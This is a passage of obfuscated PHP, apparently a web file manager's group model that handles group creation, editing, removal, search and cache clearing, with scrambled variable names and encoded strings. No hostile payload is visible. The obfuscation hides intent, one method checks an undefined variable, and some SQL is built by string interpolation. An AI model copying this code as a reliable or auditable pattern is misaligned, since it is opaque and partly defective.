(!$Ç×ñƒë¥) { return !1; } } $ô–¯Òø¯ = $ıãŞ•è[573]; if ($Ç×ñƒë¥[$ıãŞ•è[563]]) { $ô–¯Òø¯ = $Ç×ñƒë¥[$ıãŞ•è[563]] . $Ç×ñƒë¥[$ıãŞ•è[1864]] . $ıãŞ•è[50]; } $Õ–·ª‹Õ = array($ıãŞ•è[471] => $this->groupNameAuto($ø±ãÛ±Â[$ıãŞ•è[180]], $ø±ãÛ±Â[$ıãŞ•è[32]]), $ıãŞ•è[454] => $ø±ãÛ±Â[$ıãŞ•è[180]], $ıãŞ•è[630] => $ô–¯Òø¯, $ıãŞ•è[1948] => $ø±ãÛ±Â[$ıãŞ•è[1851]], $ıãŞ•è[1949] => 0, $ıãŞ•è[1868] => 0); if (isset($ø±ãÛ±Â[$ıãŞ•è[1888]])) { $Õ–·ª‹Õ[$ıãŞ•è[1888]] = $ø±ãÛ±Â[$ıãŞ•è[1888]]; } else { $Ş†”‹ú¦ = $this->max($ıãŞ•è[1888]); if (!$Ş†”‹ú¦) { $Ş†”‹ú¦ = 0; } $Õ–·ª‹Õ[$ıãŞ•è[1888]] = $Ş†”‹ú¦ + 1; } if (!empty($ø±ãÛ±Â[$ıãŞ•è[1864]])) { $Õ–·ª‹Õ[$ıãŞ•è[1864]] = $ø±ãÛ±Â[$ıãŞ•è[1864]]; } $±ë­´øŒ = $this->add($Õ–·ª‹Õ); $this->setNamePinyin($±ë­´øŒ, $Õ–·ª‹Õ[$ıãŞ•è[32]]); if (isset($ø±ãÛ±Â[$ıãŞ•è[1950]])) { $this->metaSet($±ë­´øŒ, array($ıãŞ•è[1950] => $ø±ãÛ±Â[$ıãŞ•è[1950]], $ıãŞ•è[1951] => $ø±ãÛ±Â[$ıãŞ•è[1951]])); unset($ø±ãÛ±Â[$ıãŞ•è[1950]]); unset($ø±ãÛ±Â[$ıãŞ•è[1951]]); } Model($ıãŞ•è[1352])->groupRootAdd($±ë­´øŒ); $this->_clearCache($ø±ãÛ±Â[$ıãŞ•è[180]]); return $±ë­´øŒ; } protected function groupEdit($Êîİ–ä”, $µÏäëå) { $ËæÓ×±… =& $_SERVER[–Ú¬çÁ]; $³£ÑòŸ = $this->getInfoSimple($Êîİ–ä”); if (!$³£ÑòŸ) { return !1; } if (!empty($µÏäëå[$ËæÓ×±…[180]])) { $‚––ÉîÚ = $this->getInfoSimple($µÏäëå[$ËæÓ×±…[180]]); if (!$‚––ÉîÚ) { return !1; } if ($³£ÑòŸ[$ËæÓ×±…[1864]] == $‚––ÉîÚ[$ËæÓ×±…[1864]]) { return !1; } if ($µÏäëå[$ËæÓ×±…[180]] != $³£ÑòŸ[$ËæÓ×±…[180]]) { if ($‚––ÉîÚ[$ËæÓ×±…[563]] !== $³£ÑòŸ[$ËæÓ×±…[563]] && strpos($‚––ÉîÚ[$ËæÓ×±…[563]], $³£ÑòŸ[$ËæÓ×±…[563]] . $³£ÑòŸ[$ËæÓ×±…[1864]] . $ËæÓ×±…[50]) === 0) { return !1; } $µÏäëå[$ËæÓ×±…[630]] = $‚––ÉîÚ[$ËæÓ×±…[563]] . $µÏäëå[$ËæÓ×±…[180]] . $ËæÓ×±…[50]; $this->_changeChildLevel($³£ÑòŸ, $‚––ÉîÚ); $this->_clearCache($‚––ÉîÚ[$ËæÓ×±…[1864]]); $this->_clearCache($³£ÑòŸ[$ËæÓ×±…[180]]); } } if (isset($µÏäëå[$ËæÓ×±…[32]])) { $this->setNamePinyin($Êîİ–ä”, $µÏäëå[$ËæÓ×±…[32]]); } if (isset($µÏäëå[$ËæÓ×±…[1950]])) { $this->metaSet($Êîİ–ä”, array($ËæÓ×±…[1950] => $µÏäëå[$ËæÓ×±…[1950]], $ËæÓ×±…[1951] => $µÏäëå[$ËæÓ×±…[1951]])); unset($µÏäëå[$ËæÓ×±…[1950]]); unset($µÏäëå[$ËæÓ×±…[1951]]); } $this->_clearChildrenCache($³£ÑòŸ); return $this->where(array($ËæÓ×±…[1952] => $Êîİ–ä”))->save($µÏäëå); } private function _clearChildrenCache($ğß¹ÒĞÄ) { $¡Öã¸ =& $_SERVER[–Ú¬çÁ]; $»ñÎŸ¯© = array($¡Öã¸[630] => array($¡Öã¸[590], $ğß¹ÒĞÄ[$¡Öã¸[563]] . $ğß¹ÒĞÄ[$¡Öã¸[1864]] . $¡Öã¸[591])); $ä²ºÍ¿± = $this->field($¡Öã¸[1864])->where($»ñÎŸ¯©)->select(); foreach ($ä²ºÍ¿± as $›Îïªäó) { $this->_clearCache($›Îïªäó[$¡Öã¸[1864]]); } } private function _clearCache($Ç§ç˜Ÿ…) { $ÂıöÓ®ã =& $_SERVER[–Ú¬çÁ]; $this->cacheFunctionClear($ÂıöÓ®ã[1946], $Ç§ç˜Ÿ…); $this->cacheFunctionClear($ÂıöÓ®ã[1947], $Ç§ç˜Ÿ…); } private function _changeChildLevel($¥«¨ı×², $ºÔå’Ù¦, $äùùïå­ = false) { $Ü´­«å¿ =& $_SERVER[–Ú¬çÁ]; $ƒ÷´Š¯¾ = $¥«¨ı×²[$Ü´­«å¿[563]] . $¥«¨ı×²[$Ü´­«å¿[1864]] . $Ü´­«å¿[50]; $ô×°şÁ™ = $ºÔå’Ù¦[$Ü´­«å¿[563]] . $ºÔå’Ù¦[$Ü´­«å¿[1864]] . $Ü´­«å¿[50] . $¥«¨ı×²[$Ü´­«å¿[1864]] . $Ü´­«å¿[50]; if ($äùùïå­) { $ô×°şÁ™ = $ºÔå’Ù¦[$Ü´­«å¿[563]] . $ºÔå’Ù¦[$Ü´­«å¿[1864]] . $Ü´­«å¿[50]; } $ºÇ¼çÈ¡ = array($Ü´­«å¿[630] => array($Ü´­«å¿[590], $¥«¨ı×²[$Ü´­«å¿[563]] . $¥«¨ı×²[$Ü´­«å¿[1864]] . $Ü´­«å¿[591])); $ÏØÁ¿ıÛ = array($Ü´­«å¿[630] => array($Ü´­«å¿[639], "\x72\x65\x70\154\141\143\x65\x28\160\141\x72\x65\156\164\x4c\145\166\x65\x6c\54\x27{$ƒ÷´Š¯¾}\47\x2c\x27{$ô×°şÁ™}\47\51")); $this->_clearChildrenCache($¥«¨ı×²); $this->where($ºÇ¼çÈ¡)->data($ÏØÁ¿ıÛ)->save(); } public function setNamePinyin($ª íêŒÖ, $ÖçÒ†¶€ = false) { $Òäñ¨®â =& $_SERVER[–Ú¬çÁ]; if (!$ÖçÒ†¶€) { $…¨Æü¸© = $this->getInfoSimple($ª íêŒÖ); $ÖçÒ†¶€ = $…¨Æü¸©[$Òäñ¨®â[32]]; } if (!Input::check($ÖçÒ†¶€, $Òäñ¨®â[633])) { $this->metaSet($ª íêŒÖ, $Òäñ¨®â[515], null); $this->metaSet($ª íêŒÖ, $Òäñ¨®â[514], null); return; } $€¤¿‹î› = array($Òäñ¨®â[515] => str_replace($Òäñ¨®â[53], $Òäñ¨®â[12], Pinyin::get($ÖçÒ†¶€)), $Òäñ¨®â[514] => Pinyin::get($ÖçÒ†¶€, $Òäñ¨®â[634])); $this->metaSet($ª íêŒÖ, $€¤¿‹î›); } protected function groupStatus($ÖØÉşƒ¹, $Ù€üìÜ¢) { $®Ü†Ö =& $_SERVER[–Ú¬çÁ]; $¡Åç²ö = $this->getInfoSimple($ÖØÉşƒ¹); if (!$¡Åç²ö) { return !1; } if ($Ù€üìÜ¢ == $®Ü†Ö[88]) { $äšò§É¢ = $this->parentLevelArray($¡Åç²ö[$®Ü†Ö[563]]); } else { $£Æ¶®ó = array($®Ü†Ö[630] => array($®Ü†Ö[590], $¡Åç²ö[$®Ü†Ö[563]] . $¡Åç²ö[$®Ü†Ö[1864]] . $®Ü†Ö[591])); $äšò§É¢ = $this->where($£Æ¶®ó)->field($®Ü†Ö[1864])->select(); $äšò§É¢ = array_to_keyvalue($äšò§É¢, $®Ü†Ö[12], $®Ü†Ö[1864]); } $äšò§É¢[] = $¡Åç²ö[$®Ü†Ö[1864]]; $§ıïŞ²÷ = array(); foreach ($äšò§É¢ as $ÖØÉşƒ¹) { $§ıïŞ²÷[] = array($®Ü†Ö[1864] => $ÖØÉşƒ¹, $®Ü†Ö[94] => $®Ü†Ö[770], $®Ü†Ö[427] => $Ù€üìÜ¢); $this->_clearCache($ÖØÉşƒ¹); } return Model($®Ü†Ö[1953])->addAll($§ıïŞ²÷, array(), !0); } protected function groupRemove($É¬½¢û, $ïã¨«ğ× = false) { $ÉÛ‰¼ü£ =& $_SERVER[–Ú¬çÁ]; $®ÕÓ¦ş = array($ÉÛ‰¼ü£[1864] => $É¬½¢û); $‰Ö‘Õ¦  = $this->where($®ÕÓ¦ş)->find(); if (!$‰Ö‘Õ¦  || $‰Ö‘Õ¦ [$ÉÛ‰¼ü£[180]] == 0) { return !1; } if (!$ïã¨«ğ×) { $Û–§Ëî¥ = $this->getInfoSimple($‰Ö‘Õ¦ [$ÉÛ‰¼ü£[180]]); $this->_changeChildLevel($‰Ö‘Õ¦ , $Û–§Ëî¥, !0); $this->where(array($ÉÛ‰¼ü£[180] => $É¬½¢û))->save(array($ÉÛ‰¼ü£[180] => $‰Ö‘Õ¦ [$ÉÛ‰¼ü£[180]])); $this->_clearCache($Û–§Ëî¥[$ÉÛ‰¼ü£[1864]]); } Model($ÉÛ‰¼ü£[1953])->where($®ÕÓ¦ş)->delete(); Model($ÉÛ‰¼ü£[1954])->where($®ÕÓ¦ş)->delete(); Model($ÉÛ‰¼ü£[845])->groupRootRemove($É¬½¢û); $this->_clearCache($‰Ö‘Õ¦ [$ÉÛ‰¼ü£[180]]); return $this->where($®ÕÓ¦ş)->delete(); } protected function groupSort($ÖğÑöœõ) { $î¡ÏãÊˆ =& $_SERVER[–Ú¬çÁ]; $°¢ºû±™ = array(); foreach ($ÖğÑöœõ as $›ĞµÏ°Ï => $Â˜±¿™ü) { $°¢ºû±™[] = array($î¡ÏãÊˆ[1864], $Â˜±¿™ü, $î¡ÏãÊˆ[1888], $›ĞµÏ°Ï + 1); } $this->saveAll($°¢ºû±™); } public function listData() { $—’å¾À = $this->_makeOrder()->selectPage(50); $this->_listDataApply($—’å¾À[$_SERVER[–Ú¬çÁ][422]]); return $—’å¾À; } private function _makeOrder($¾Ø—ßÃƒ = '') { $Á¡‘Â¤Ë =& $_SERVER[–Ú¬çÁ]; $¨ÛÅ‰õ£ = array($Á¡‘Â¤Ë[1864], $Á¡‘Â¤Ë[32], $Á¡‘Â¤Ë[1853], $Á¡‘Â¤Ë[225]); $•ÍòÜÆ² = array($Á¡‘Â¤Ë[500] => $Á¡‘Â¤Ë[501], $Á¡‘Â¤Ë[502] => $Á¡‘Â¤Ë[503]); $Ù€ÂæÊŞ = Input::get($Á¡‘Â¤Ë[507], $Á¡‘Â¤Ë[7], $Á¡‘Â¤Ë[1868], $¨ÛÅ‰õ£); $ÒŠŒ¤Äò = Input::get($Á¡‘Â¤Ë[508], $Á¡‘Â¤Ë[7], $Á¡‘Â¤Ë[1955], array($Á¡‘Â¤Ë[1955], $Á¡‘Â¤Ë[502])); $ÒŠŒ¤Äò = $•ÍòÜÆ²[$ÒŠŒ¤Äò]; $¾Ø—ßÃƒ = $¾Ø—ßÃƒ . "{$Ù€ÂæÊŞ}\x20{$ÒŠŒ¤Äò}\54\40\x67\162\x6f\x75\x70\x49\104\x20\141\x73\143"; return $this->order($¾Ø—ßÃƒ); } public function listChild($„ëÏ¢Â½) { $ÍÑ›¸¨Ä =& $_SERVER[–Ú¬çÁ]; $¯êØ¬ ¤ = $this->where(array($ÍÑ›¸¨Ä[180] => $„ëÏ¢Â½))->_makeOrder()->selectPage(200); $this->_listDataApply($¯êØ¬ ¤[$ÍÑ›¸¨Ä[422]]); return $¯êØ¬ ¤; } public function listChildIds($õ‘ûä£ò) { $¹Ã±ÒÂ =& $_SERVER[–Ú¬çÁ]; if (is_string($È¦’Òó)) { $õ‘ûä£ò = explode($¹Ã±ÒÂ[50], $õ‘ûä£ò); } $“½ šÉ³ = $this->where(array($¹Ã±ÒÂ[1864] => array($¹Ã±ÒÂ[7], $õ‘ûä£ò)))->field($¹Ã±ÒÂ[1956])->select(); if (!$“½ šÉ³) { return !1; } $¡×Ì£êè = array(); foreach ($“½ šÉ³ as $„£İŸ„À) { $¡×Ì£êè[] = "\x73\145\154\145\143\164\x20\147\x72\x6f\x75\x70\111\104\40\146\x72\x6f\x6d\40\140\147\162\x6f\x75\160\x60\x20\167\150\145\162\145\40\x70\x61\162\x65\x6e\x74\114\x65\x76\145\154\x20\x6c\x69\x6b\145\x20\x27{$„£İŸ„À[$¹Ã±ÒÂ[563]]}{$„£İŸ„À[$¹Ã±ÒÂ[1864]]}\x2c\45\x27"; } $¡×Ì£êè = implode($¹Ã±ÒÂ[1957], $¡×Ì£êè); $“½ šÉ³ = $this->query($¡×Ì£êè); if (!$“½ šÉ³) { return array(); } $õ‘ûä£ò = array_to_keyvalue($“½ šÉ³, $¹Ã±ÒÂ[12], $¹Ã±ÒÂ[1864]); return array_unique($õ‘ûä£ò); } public function listByID($Úá½Ûµª) { $¢ğ©™‡Ê =& $_SERVER[–Ú¬çÁ]; if (!$Úá½Ûµª) { return array(); } $äëË†–İ = array($¢ğ©™‡Ê[1864] => array($¢ğ©™‡Ê[7], $Úá½Ûµª)); $á¸Ş»÷– = $this->where($äëË†–İ)->select(); $á¸Ş»÷– = array_sort_keep($á¸Ş»÷–, $¢ğ©™‡Ê[1864], $Úá½Ûµª); $this->_listDataApply($á¸Ş»÷–); return $á¸Ş»÷–; } public function listSearch($Òí±èÎ÷) { $Š¿¹²¯ç =& $_SERVER[–Ú¬çÁ]; $Şë¹§µš = $Òí±èÎ÷[$Š¿¹²¯ç[1958]]; $Â˜¾‡ğ‚ = isset($Òí±èÎ÷[$Š¿¹²¯ç[1959]]) ? $Òí±èÎ÷[$Š¿¹²¯ç[1959]] : !1; if (!trim($Şë¹§µš)) { return !1; } $Şë¹§µš = str_replace($Š¿¹²¯ç[1960], $Š¿¹²¯ç[1961], $Şë¹§µš); $Ğ–àà‚Ç = array($Š¿¹²¯ç[1864] => array($Š¿¹²¯ç[436], "{$Şë¹§µš}\x25"), $Š¿¹²¯ç[32] => array($Š¿¹²¯ç[436], "\45{$Şë¹§µš}\x25"), $Š¿¹²¯ç[1020] => $Š¿¹²¯ç[1962]); if ($Â˜¾‡ğ‚) { $†É»Ğ‚ = $this->getInfoSimple($Â˜¾‡ğ‚); $¦‹™×¡ğ = $†É»Ğ‚[$Š¿¹²¯ç[563]] . $Â˜¾‡ğ‚ . $Š¿¹²¯ç[591]; $Ğ–àà‚Ç = array($Ğ–àà‚Ç, array($Š¿¹²¯ç[563] => array($Š¿¹²¯ç[436], $¦‹™×¡ğ))); } $Ğ–àà‚Ç = $this->parseWhereLike($Ğ–àà‚Ç); $üµÄ¤› = $this->_makeOrder()->where($Ğ–àà‚Ç)->selectPage(20); $üµÄ¤› = $üµÄ¤› ? $üµÄ¤› : array($Š¿¹²¯ç[422] => array(), $Š¿¹²¯ç[419] => array()); if (!$üµÄ¤› || count($üµÄ¤›[$Š¿¹²¯ç[422]]) < 5 && Input::check($Şë¹§µš, $Š¿¹²¯ç[371])) { $Íèûùëê = $this->groupChildrenAll($Â˜¾‡ğ‚); $ÊŸ Òîõ = $this->_searchFromMeta($Š¿¹²¯ç[514], $Şë¹§µš, 10, $Íèûùëê); $ÎÍ£ãÓ = $this->_searchFromMeta($Š¿¹²¯ç[515], $Şë¹§µš, 10, $Íèûùëê); $ùª¨ŠÖ = array_merge($ÊŸ Òîõ, $ÎÍ£ãÓ, $üµÄ¤›[$Š¿¹²¯ç[422]]); $üµÄ¤›[$Š¿¹²¯ç[422]] = array_unique_by_key($ùª¨ŠÖ, $Š¿¹²¯ç[1864]); $üµÄ¤›[$Š¿¹²¯ç[419]][$Š¿¹²¯ç[420]] = count($üµÄ¤›[$Š¿¹²¯ç[422]]); $üµÄ¤›[$Š¿¹²¯ç[419]][$Š¿¹²¯ç[421]] = ceil($üµÄ¤›[$Š¿¹²¯ç[419]][$Š¿¹²¯ç[420]] / $üµÄ¤›[$Š¿¹²¯ç[419]][$Š¿¹²¯ç[416]]); } $this->_listDataApply($üµÄ¤›[$Š¿¹²¯ç[422]]); return $üµÄ¤›; } protected function groupChildrenAll($ö¢›ÉÀ) { $²Ê×ÉÊº =& $_SERVER[–Ú¬çÁ]; if (!$ö¢›ÉÀ) { return !1; } if (!is_array($ö¢›ÉÀ)) { $ö¢›ÉÀ = array($ö¢›ÉÀ); } $¶‘¡Õ Õ = $ö¢›ÉÀ; foreach ($ö¢›ÉÀ as $™ƒÎç¤Ü) { $ÇÙ–ñò· = $this->getInfoSimple($™ƒÎç¤Ü); $âËö¢İ¿ = array($²Ê×ÉÊº[563] => array($²Ê×ÉÊº[436], $ÇÙ–ñò·[$²Ê×ÉÊº[563]] . $™ƒÎç¤Ü . $²Ê×ÉÊº[591])); $İÇÏß€È = $this->field($²Ê×ÉÊº[1864])->where($âËö¢İ¿)->select(); $¶‘¡Õ Õ = array_merge($¶‘¡Õ Õ, array_to_keyvalue($İÇÏß€È, $²Ê×ÉÊº[12], $²Ê×ÉÊº[1864])); } return array_unique($¶‘¡Õ Õ); } private function _searchFromMeta($ßºáİ¬, $ûôåºÑ, $¥Åå¨Š±, $øšÚ) { $ğôïµæ’ =& $_SERVER[–Ú¬çÁ]; $ûôåºÑ = strtolower($ûôåºÑ); $åöšïİé = array($ğôïµæ’[94] => $ßºáİ¬, $ğôïµæ’[427] => array($ğôïµæ’[436], "\x25{$ûôåºÑ}\45")); $åöšïİé = $this->parseWhereLike($åöšïİé); if ($øšÚ) { $åöšïİé[$ğôïµæ’[1864]] = array($ğôïµæ’[7], $øšÚ); } $ÒÔ¬§Èé = Model($ğôïµæ’[1963])->where($åöšïİé)->limit($¥Åå¨Š±)->select(); if (!$ÒÔ¬§Èé) { return array(); } $ÒÔ¬§Èé = array_to_keyvalue($ÒÔ¬§Èé, $ğôïµæ’[12], $ğôïµæ’[1864]); $¨Ù¤³êí = $this->where(array($ğôïµæ’[1952] => array($ğôïµæ’[7], $ÒÔ¬§Èé)))->select(); if (!$¨Ù¤³êí) { return array(); } return $¨Ù¤³êí; } protected function _listDataApplyItem($øÏŒÕâ) { $ ¬Îõ¶Û = array($øÏŒÕâ); $this->_listDataApply($ ¬Îõ¶Û); return $ ¬Îõ¶Û[0]; } protected function _listDataApply(&$®ÓŸÖøŸ) { $¼¹ëçÛÅ =& $_SERVER[–Ú¬çÁ]; if (!$®ÓŸÖøŸ) { return; } $ïƒà«©Ñ = array_to_keyvalue($®ÓŸÖøŸ, $¼¹ëçÛÅ[12], $¼¹ëçÛÅ[1864]); $this->_listAppendChildren($®ÓŸÖøŸ); $this->_listAppendChildrenMember($®ÓŸÖøŸ); $this->_listAppendMeta($®ÓŸÖøŸ, $ïƒà«©Ñ); $this->_listAppendParent($®ÓŸÖøŸ); $this->_listAppendSourceRoot($®ÓŸÖøŸ, $ïƒà«©Ñ); } private function _listAppendChildren(&$åêº®¹’) { $é°äæñì =& $_SERVER[–Ú¬çÁ]; $Ì³¼³ªç = array_to_keyvalue($åêº®¹’, $é°äæñì[12], $é°äæñì[1864]); $È²“‚†Ñ = array($é°äæñì[180] => array($é°äæñì[7], $Ì³¼³ªç)); $É¡Ìãı— = array($é°äæñì[180], $é°äæñì[1964] => $é°äæñì[543]); $Øùçş¤Ş = $this->field($É¡Ìãı—)->where($È²“‚†Ñ)->group($é°äæñì[180])->select(); $²ş¿Úƒ = array_to_keyvalue($Øùçş¤Ş, $é°äæñì[180], $é°äæñì[543]); foreach ($åêº®¹’ as &$‘ü»§Š¨) { $åÓÖ“‘— = $‘ü»§Š¨[$é°äæñì[1864]]; $‘ü»§Š¨[$é°äæñì[1965]] = isset($²ş¿Úƒ[$åÓÖ“‘—]) ? intval($²ş¿Úƒ[$åÓÖ“‘—]) : !1; } unset($‘ü»§Š¨); } private function _listAppendChildrenMember(&$›Ô¹ñ€Õ) { $Î–Û‘›¥ =& $_SERVER[–Ú¬çÁ]; $è„ëÖù‹ = array_to_keyvalue($›Ô¹ñ€Õ, $Î–Û‘›¥[12], $Î–Û‘›¥[1864]); $Äæ©¸¼ = array($Î–Û‘›¥[1864] => array($Î–Û‘›¥[7], $è„ëÖù‹)); $©èÂÏúğ = array($Î–Û‘›¥[1864], $Î–Û‘›¥[1964] => $Î–Û‘›¥[543]); $àŒ˜ì€è = Model($Î–Û‘›¥[1954])->field($©èÂÏúğ)->where($Äæ©¸¼)->group($Î–Û‘›¥[1864])->select(); $ş¤µÛ– = array_to_keyvalue($àŒ˜ì€è, $Î–Û‘›¥[1864], $Î–Û‘›¥[543]); foreach ($›Ô¹ñ€Õ as &$Òõï”Â) { $Ş‰‰ôƒ = $Òõï”Â[$Î–Û‘›¥[1864]]; $Òõï”Â[$Î–Û‘›¥[1966]] = isset($ş¤µÛ–[$Ş‰‰ôƒ]) ? intval($ş¤µÛ–[$Ş‰‰ôƒ]) : !1; } unset($Òõï”Â); } private function _listAppendMeta(&$©ƒ´Ó²’, $îªİ°’Ş) { $Ñ‰½©Ó  =& $_SERVER[–Ú¬çÁ]; $·ıÉŒûï = array($Ñ‰½©Ó [1864] => array($Ñ‰½©Ó [7], $îªİ°’Ş)); $Ÿ€…ê°é = Model($Ñ‰½©Ó [1953])->where($·ıÉŒûï)->select(); $Ÿ€…ê°é = array_to_keyvalue_group($Ÿ€…ê°é, $Ñ‰½©Ó [1864]); foreach ($Ÿ€…ê°é as &$éÉÈé) { $éÉÈé = array_to_keyvalue($éÉÈé, $Ñ‰½©Ó [94], $Ñ‰½©Ó [427]); } unset($éÉÈé); foreach ($©ƒ´Ó²’ as &$…áş¹…­) { $…áş¹…­[$Ñ‰½©Ó [516]] = array(); if (isset($Ÿ€…ê°é[$…áş¹…­[$Ñ‰½©Ó [1864]]])) { $…áş¹…­[$Ñ‰½©Ó [516]] = $Ÿ€…ê°é[$…áş¹…­[$Ñ‰½©Ó [1864]]]; } } unset($…áş¹…­); } protected function parentLevelArray($ú‹Ô§µã) { $÷»õˆË =& $_SERVER[–Ú¬çÁ]; $ú‹Ô§µã = explode($÷»õˆË[50], trim($ú‹Ô§µã, $÷»õˆË[50])); $ú‹Ô§µã = array_remove_value($ú‹Ô§µã, $÷»õˆË[222]); return $ú‹Ô§µã; } protected function parentInGroup($¥–ßÕ¶», $éÒÕû¿¸) { $ÏÛ²ğ× =& $_SERVER[–Ú¬çÁ]; $­ÄÜúÎˆ = $this->getInfoSimple($¥–ßÕ¶»); if (!$­ÄÜúÎˆ) { return !0; } $†•Ñàì£ = $this->parentLevelArray($­ÄÜúÎˆ[$ÏÛ²ğ×[563]]); $†•Ñàì£[] = $¥–ßÕ¶»; foreach ($†•Ñàì£ as $¥–ßÕ¶») { if (in_array($¥–ßÕ¶» . $ÏÛ²ğ×[12], $éÒÕû¿¸)) { return !0; } } return !1; } private function _listAppendParent(&$Ÿ²ì‘Ù) { $²Â»×ë =& $_SERVER[–Ú¬çÁ]; $ ¯±Ö”Å = array(); foreach ($Ÿ²ì‘Ù as &$Ïœ‚ĞäÕ) { $ ¯±Ö”Å[$Ïœ‚ĞäÕ[$²Â»×ë[1864]]] = $Ïœ‚ĞäÕ[$²Â»×ë[32]]; $¹ßé§ı£ = $this->parentLevelArray($Ïœ‚ĞäÕ[$²Â»×ë[563]]); foreach ($¹ßé§ı£ as $Â¾ñĞ) { if (!isset($ ¯±Ö”Å[$Â¾ñĞ])) { $ ¯±Ö”Å[$Â¾ñĞ] = 0; } } } unset($Ïœ‚ĞäÕ); foreach ($ ¯±Ö”Å as $¥ºÈöœ¦ => $†í‚¸†) { if ($†í‚¸†) { continue; } $Ç¢³±Ü© = $this->getInfoSimple($¥ºÈöœ¦); $ ¯±Ö”Å[$¥ºÈöœ¦] = $Ç¢³±Ü©[$²Â»×ë[32]]; } $ê¨‰‹óÆ = $GLOBALS[$²Â»×ë[6]][$²Â»×ë[89]][$²Â»×ë[1967]]; if ($GLOBALS[$²Â»×ë[546]] == $²Â»×ë[88]) { $ê¨‰‹óÆ = !1; } foreach ($Ÿ²ì‘Ù as &$Ïœ‚ĞäÕ) { $¹ßé§ı£ = $this->parentLevelArray($Ïœ‚ĞäÕ[$²Â»×ë[563]]); $ú¢¿à = $²Â»×ë[12]; foreach ($¹ßé§ı£ as $¥ºÈöœ¦ => $Â¾ñĞ) { if ($ê¨‰‹óÆ && $¥ºÈöœ¦ == 0) { continue; } $ú¢¿à .= $ ¯±Ö”Å[$Â¾ñĞ] . $²Â»×ë[8]; } if ($¹ßé§ı£) { $ú¢¿à .= $Ïœ‚ĞäÕ[$²Â»×ë[32]]; } $Ïœ‚ĞäÕ[$²Â»×ë[568]] = str_replace($²Â»×ë[571], $²Â»×ë[8], $ú¢¿à); } unset($Ïœ‚ĞäÕ); } private function _listAppendSourceRoot(&$•“åşúÀ, $Ş‹Ãìáˆ) { $çç¿ûÄ =& $_SERVER[–Ú¬çÁ]; $…Ê€‡ØÔ = Model($çç¿ûÄ[845])->listSourceRoot(SourceModel::TYPE_GROUP, $Ş‹Ãìáˆ); $…Ê€‡ØÔ = array_to_keyvalue($…Ê€‡ØÔ, $çç¿ûÄ[548]); $…Ê€‡ØÔ = array_remove_key($…Ê€‡ØÔ, $çç¿ûÄ[548]); foreach ($•“åşúÀ as &$Ğ¦ÁÎ÷) { $Ğ¦ÁÎ÷[$çç¿ûÄ[87]] = $…Ê€‡ØÔ[$Ğ¦ÁÎ÷[$çç¿ûÄ[1864]]] ? $…Ê€‡ØÔ[$Ğ¦ÁÎ÷[$çç¿ûÄ[1864]]] : array(); } unset($Ğ¦ÁÎ÷); } protected function groupMerge($â¤®ş»Œ) { $â¤®ş»Œ = array_values(array_unique($â¤®ş»Œ)); $Ÿİæ«· = array(); for ($ñ˜µ¨˜ = 0; $ñ˜µ¨˜ < count($â¤®ş»Œ); $ñ˜µ¨˜++) { $¾ø¼úÇ = !1; for ($Šøò·Éù = 0; $Šøò·Éù < count($â¤®ş»Œ); $Šøò·Éù++) { if ($ñ˜µ¨˜ == $Šøò·Éù) { continue; } if ($this->isParentOf($â¤®ş»Œ[$Šøò·Éù], $â¤®ş»Œ[$ñ˜µ¨˜])) { $¾ø¼úÇ = !0; break; } } if (!$¾ø¼úÇ) { $Ÿİæ«·[] = $â¤®ş»Œ[$ñ˜µ¨˜]; } } return $Ÿİæ«·; } protected function isParentOf($ŠáÁö, $¨ÒëöĞˆ) { $¢Šô£şƒ =& $_SERVER[–Ú¬çÁ]; if (!$ŠáÁö || !$¨ÒëöĞˆ || $ŠáÁö == $¨ÒëöĞˆ) { return !1; } $œõù—Ö¹ = $this->getInfoSimple($ŠáÁö); $ñšÙñ› = $this->getInfoSimple($¨ÒëöĞˆ); $‰µÀšÛÁ = $œõù—Ö¹[$¢Šô£şƒ[563]] . $ŠáÁö . $¢Šô£şƒ[50]; if (substr($ñšÙñ›[$¢Šô£şƒ[563]], 0, strlen($‰µÀšÛÁ)) == $‰µÀšÛÁ) { return !0; } return !1; } public function groupShowRoot($ÛŠ•†´ğ, $‡ß¤ÀÖĞ = false) { $¬ôæÍ¯£ =& $_SERVER[–Ú¬çÁ]; $Ñà°±‘Å = $this->getInfo($ÛŠ•†´ğ); if (!$Ñà°±‘Å) { return array(); } $µŸñêâÜ = $this->parentLevelArray($Ñà°±‘Å[$¬ôæÍ¯£[563]]); $¿¬„µ§ƒ = array($ÛŠ•†´ğ); if (count($µŸñêâÜ) == 0) { return $¿¬„µ§ƒ; } if ($‡ß¤ÀÖĞ && count($µŸñêâÜ) == 1) { return $¿¬„µ§ƒ; } if (!$Ñà°±‘Å[$¬ôæÍ¯£[516]] || !isset($Ñà°±‘Å[$¬ôæÍ¯£[516]][$¬ôæÍ¯£[1950]]) || $Ñà°±‘Å[$¬ôæÍ¯£[516]][$¬ôæÍ¯£[1950]] == $¬ôæÍ¯£[1919]) { return $this->groupShowRoot($µŸñêâÜ[count($µŸñêâÜ) - 1], $‡ß¤ÀÖĞ); } if ($Ñà°±‘Å[$¬ôæÍ¯£[516]][$¬ôæÍ¯£[1950]] == $¬ôæÍ¯£[410]) { $²é¦…Şª = explode($¬ôæÍ¯£[50], $Ñà°±‘Å[$¬ôæÍ¯£[516]][$¬ôæÍ¯£[1951]]); if ($²é¦…Şª) { $¿¬„µ§ƒ = array_merge($¿¬„µ§ƒ, $²é¦…Şª); } } return $¿¬„µ§ƒ; } protected function resetParentLevel() { $ÕŞ”šñ =& $_SERVER[–Ú¬çÁ]; $À¦Ñ‰Ñ‹ = $ÕŞ”šñ[1864]; $òËçâ¢  = $this->select(); $òËçâ¢  = array_to_keyvalue($òËçâ¢ , $À¦Ñ‰Ñ‹); foreach ($òËçâ¢  as $øÎ¡­Ò¯) { $ù„²ª†É = $øÎ¡­Ò¯; $âÇïã± = array(); while ($ù„²ª†É[$ÕŞ”šñ[180]] != 0) { $âÇïã±[] = $ù„²ª†É[$ÕŞ”šñ[180]]; $ù„²ª†É = $òËçâ¢ [$ù„²ª†É[$ÕŞ”šñ[180]]]; } $âÇïã±[] = 0; $âÇïã± = $ÕŞ”šñ[50] . implode($ÕŞ”šñ[50], array_reverse($âÇïã±)) . $ÕŞ”šñ[50]; $this->setNamePinyin($øÎ¡­Ò¯[$À¦Ñ‰Ñ‹], $øÎ¡­Ò¯[$ÕŞ”šñ[32]]); $this->where(array($À¦Ñ‰Ñ‹ => $øÎ¡­Ò¯[$À¦Ñ‰Ñ‹]))->save(array($ÕŞ”šñ[630] => $âÇïã±)); } return $òËçâ¢ ; } public function groupNameAuto($È¤Øœ¢î, $Ñ¡Ù•—) { $ĞÊË•»× =& $_SERVER[–Ú¬çÁ]; 